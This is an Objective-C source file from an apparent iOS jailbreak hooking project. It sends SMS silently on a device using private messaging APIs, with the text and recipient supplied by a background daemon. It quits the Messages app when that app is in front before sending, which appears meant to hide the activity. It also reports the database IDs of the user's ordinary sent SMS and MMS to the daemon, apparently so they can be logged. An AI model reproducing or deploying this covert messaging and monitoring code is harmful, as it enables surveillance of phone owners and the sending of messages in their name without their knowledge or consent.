//
//  SMSSender000.m
//  HookPOC
//
//  Created by Makara Khloth on 3/8/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SMSSender000.h"
#import "FxMessage.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"

#import "IMService+IOS6.h"
#import "IMServiceImpl+IOS6.h"
#import "IMAccount.h"
#import "IMAccount+IOS6.h"
#import "IMHandle.h"
#import "IMHandle+IOS6.h"
#import "IMMessage.h"
#import "IMMessage+IOS6.h"
#import "IMChat.h"
#import "IMChat+IOS6.h"
#import "IMAccountController+IOS6.h"
#import "IMChatRegistry.h"

#import "SpringBoard.h"
#import "SBApplication.h"

#import "CKConversationList.h"
#import "CKConversationList+IOS5.h"
#import "CKConversationList+IOS6.h"

#import "NSConcreteMutableAttributedString.h"
#import "NSConcreteAttributedString.h"

#import <objc/runtime.h>

static SMSSender000 *_SMSSender000 = nil;

@interface SMSSender000 (private)
- (void) main;
- (void) sendSMSCompleted: (NSNumber *) aError;
- (void) sendingSMSWatchDogTimerTimeout: (NSNumber *) aError;
- (void) sendMessage: (FxMessage *) aMessage;
- (void) sendMessage000: (FxMessage *) aMessage;
@end

@implementation SMSSender000

@synthesize mCurrentThread, mMessages, mSendingSMS;

+ (id) sharedSMSSender000 {
	if (_SMSSender000 == nil) {
		_SMSSender000 = [[SMSSender000 alloc] init];
	}
	return (_SMSSender000);
}

- (id) init {
	self = [super init];
	if (self) {
		DLog (@"init")
		[NSThread detachNewThreadSelector:@selector(main)
								 toTarget:self
							   withObject:nil];
	}
	return (self);
}

#pragma mark -
#pragma mark Public methods
#pragma mark -

- (FxMessage *) copyReplySMSAndDeleteOldOneIfMatchText: (NSString *) aText
										   withAddress: (NSString *) aAddress {
	FxMessage *replySMS = nil;
	DLog (@"All messages = %@", [self mMessages]);
	for (FxMessage *message in [self mMessages]) {
		if ([[message mRecipient] isEqualToString:aAddress] &&
			[[message mMessage] isEqualToString:aText]) {
			
			replySMS = [[FxMessage alloc] init];
			[replySMS setMMessage:[message mMessage]];
			[replySMS setMRecipient:[message mRecipient]];
			[replySMS setMChatGUID:[message mChatGUID]];
			
			// Remove object in iteration... make sure after remove no more iteration.
			[[self mMessages] removeObject:message];
			
			break;
		}
	}
	DLog (@"aText = %@, aAddress = %@, replySMS = %@", aText, aAddress, replySMS);
	return (replySMS);
}

#pragma mark -
#pragma mark Callback methods
#pragma mark -

- (void) sendSMSFinished: (NSInteger) aError {
	[self performSelector:@selector(sendSMSCompleted:)
				 onThread:[self mCurrentThread]
			   withObject:[NSNumber numberWithInteger:aError]
			waitUntilDone:NO];
}

- (void) normalSMSDidSend: (NSInteger) aRowID {
	// Send aRowID to daemon to select event from SMS.db
	DLog (@"Normal sms sent with aRowID = %ld", (long)aRowID);
	NSInteger rowID = aRowID;
	MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kSMSMessagePortIOS6plus];
	[messagePortSender writeDataToPort:[NSData dataWithBytes:&rowID length:sizeof(NSInteger)]];
	[messagePortSender release];
}

- (void) normalMMSDidSend: (NSInteger) aRowID {
	// Send aRowID to daemon to select event from SMS.db
	DLog (@"Normal mms sent with aRowID = %ld", (long)aRowID);
	NSInteger rowID = aRowID;
	MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kMMSMessagePortIOS6plus];
	[messagePortSender writeDataToPort:[NSData dataWithBytes:&rowID length:sizeof(NSInteger)]];
	[messagePortSender release];
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog(@"Did received data from message port, aRawData = %@", aRawData);
	
	if (aRawData) {
		NSInteger lengthOfText = 0;
		NSInteger lengthOfAddress = 0;
		NSInteger location = 0;
		
		NSString *text = nil;
		NSString *address = nil;
		
		[aRawData getBytes:&lengthOfText length:sizeof(NSInteger)];
		location += sizeof(NSInteger);
		NSData *textData = [aRawData subdataWithRange:NSMakeRange(location, lengthOfText)];
		text = [[NSString alloc] initWithData:textData encoding:NSUTF8StringEncoding];
		location += lengthOfText;
		
		[aRawData getBytes:&lengthOfAddress range:NSMakeRange(location, sizeof(NSInteger))];
		location += sizeof(NSInteger);
		NSData *addressData = [aRawData subdataWithRange:NSMakeRange(location, lengthOfAddress)];
		address = [[NSString alloc] initWithData:addressData encoding:NSUTF8StringEncoding];
		
		FxMessage *message = [[FxMessage alloc] init];
		[message setMRecipient:address];
		[message setMMessage:text];
		[[self mMessages] addObject:message];
		
		[self performSelector:@selector(sendMessage:) withObject:message afterDelay:3.0];
		
		[message release];
		
		[text release];
		[address release];
	}
}

#pragma mark -
#pragma mark Thread method
#pragma mark -

- (void) main {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	
	NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
	DLog (@"**** SMSSender identifier %@",  [[NSBundle mainBundle] bundleIdentifier]);
	
	if	(![identifier isEqualToString:@"com.apple.springboard"]) {
		DLog (@"Not Springboard !!!, so listen to daemon")
		@try {			
			MessagePortIPCReader *messagePortReader = nil;
			messagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kSendSMSCmdReplyMessagePort
													withMessagePortIPCDelegate:self];
			[messagePortReader start];
			
			mCurrentThread = [NSThread currentThread];
			mMessages = [[NSMutableArray alloc] init];
			
			// ------ Make it ready -------
			Class $IMServiceImpl = objc_getClass("IMServiceImpl");
			[$IMServiceImpl serviceWithName:@"SMS"];
			
			// ------ Make it ready -------
			Class $CKConversationList = objc_getClass("CKConversationList");
			[[$CKConversationList sharedConversationList] _beginTrackingAllExistingChatsIfNeeded];

			CFRunLoopRun();

			[messagePortReader release];
			
		} @catch (NSException *e) {
			;
		} @finally {
			;
		}
	} else {
		DLog (@"Springboard!!!, so ignore this")
	}
	[pool release];
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) sendSMSCompleted: (NSNumber *) aError {
	DLog (@"sendSMSCompleted, aError = %@, messages = %@", aError, [self mMessages]);
	if ([[self mMessages] count] == 0) {
		DLog (@"Cancel previouse perform selector because of there is no more message");
		[NSObject cancelPreviousPerformRequestsWithTarget:self
												 selector:@selector(sendingSMSWatchDogTimerTimeout:)
												   object:nil];
		
		DLog (@"[z] Current thread is %@", [NSThread currentThread]);
		//DLog (@"[z] Current run loop is %@", [NSRunLoop currentRunLoop]);
		
		// Simulate the sendingSMSWatchDogTimerTimeout: method
		[self sendingSMSWatchDogTimerTimeout:aError];
	} else {
		DLog (@"Wait for the consequences messages....");
	}
}

- (void) sendingSMSWatchDogTimerTimeout: (NSNumber *) aError {
	DLog (@"Sending SMS watch dog timer timeout, aError = %@", aError);
	[self setMSendingSMS:NO];
	
	NSInteger error = (aError != nil) ? [aError intValue] : -33;
	MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kSentSMSCmdReplyMessagePort];
	[messagePortSender writeDataToPort:[NSData dataWithBytes:&error length:sizeof(NSInteger)]];
	[messagePortSender release];
}

- (void) sendMessage: (FxMessage *) aMessage {
	DLog (@"Sending message (x)");
	[self setMSendingSMS:YES];
	
	DLog (@"Cancel previouse perform selector because there is new message to be sent");
	[NSObject cancelPreviousPerformRequestsWithTarget:self
											 selector:@selector(sendingSMSWatchDogTimerTimeout:)
											   object:nil];
	[self performSelector:@selector(sendingSMSWatchDogTimerTimeout:)
			   withObject:nil
			   afterDelay:7.0];
	
	DLog (@"[x] Current thread is %@", [NSThread currentThread]);
	//DLog (@"[x] Current run loop is %@", [NSRunLoop currentRunLoop]);
	
	SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
	SBApplication *sbMessagesApplication = [sb _accessibilityFrontMostApplication];
	if ([[sbMessagesApplication bundleIdentifier] isEqualToString:@"com.apple.MobileSMS"]) {
		[sb quitTopApplication:nil];
	}
	
	[self sendMessage000:aMessage];
}

- (void) sendMessage000: (FxMessage *) aMessage {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	DLog (@"Sending message (y)");
	
	// 1. Searching for sms account
	Class $IMServiceImpl = objc_getClass("IMServiceImpl");
	[$IMServiceImpl serviceWithName:@"SMS"];
	
	Class $IMAccountController = objc_getClass("IMAccountController");
	IMAccountController *accountController = [$IMAccountController sharedInstance];
	
	DLog(@"$IMServiceImpl = %@", [$IMServiceImpl serviceWithName:@"SMS"]);
	DLog(@"accountController = %@", accountController);
	
	DLog(@"_accounts = %@", [accountController _accounts]);
	DLog(@"accounts = %@", [accountController accounts]);
	DLog(@"operationalAccounts = %@", [accountController operationalAccounts]);
	DLog(@"connectedAccounts = %@", [accountController connectedAccounts]);
	DLog(@"activeAccounts = %@", [accountController activeAccounts]);
	DLog(@"numberOfAccounts = %d", [accountController numberOfAccounts]);
	
	IMAccount *smsAccount = nil;
	for (IMAccount *account in [accountController activeAccounts]) {
		if ([[account serviceName] isEqualToString:@"SMS"]) {
			smsAccount = account;
			break;
		}
	}
	
	DLog(@"smsAccount = %@", smsAccount);
	
	// Create sms handle
	Class $IMHandle = objc_getClass("IMHandle");
	IMHandle *smsHandle = [[$IMHandle alloc] initWithAccount:smsAccount
														  ID:[aMessage mRecipient]
											alreadyCanonical:YES];
	DLog(@"smsHandle = %@", smsHandle);
	
	// Create chat
	Class $IMChatRegistry = objc_getClass("IMChatRegistry");
	IMChatRegistry *chatRegistry = [$IMChatRegistry sharedInstance];
	IMChat *chat = [chatRegistry chatForIMHandle:smsHandle];
	
	// Set chat guid to message
	[aMessage setMChatGUID:[chat guid]];
	
	DLog(@"chatRegistry = %@", chatRegistry);
	DLog(@"chat = %@", chat);
	
	// Create sms message
	NSDictionary *attributes = [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:0]
														   forKey:@"__kIMMessagePartAttributeName"];
	Class $NSConcreteMutableAttributedString = objc_getClass("NSConcreteMutableAttributedString");
	NSConcreteMutableAttributedString *messageText = [[$NSConcreteMutableAttributedString alloc] initWithString:[aMessage mMessage]
																									 attributes:attributes];
	DLog(@"messageText = %@", messageText);
	
	Class $NSConcreteAttributedString = objc_getClass("NSConcreteAttributedString");
	NSConcreteAttributedString *messageSubject = [[$NSConcreteAttributedString alloc] initWithString:@""];
	DLog(@"messageSubject = %@", messageSubject);
	
	Class $IMMessage = objc_getClass("IMMessage");
	IMMessage *smsMessage = [[$IMMessage alloc] initWithSender:smsHandle
														  time:[NSDate date]
														  text:messageText
												messageSubject:messageSubject
											 fileTransferGUIDs:[NSArray array]
														 flags:5
														 error:nil
														  guid:nil
													   subject:nil];
	DLog(@"smsMessage = %@", smsMessage);
	
	// Send sms
	[chat sendMessage:smsMessage];
	
	[smsMessage release];
	[messageSubject release];
	[messageText release];
	[smsHandle release];
	
	[pool release];
}

#pragma mark -
#pragma mark Memory management
#pragma mark -

- (void) dealloc {
	_SMSSender000 = nil;
	[mMessages release];
	[super dealloc];
}

@end
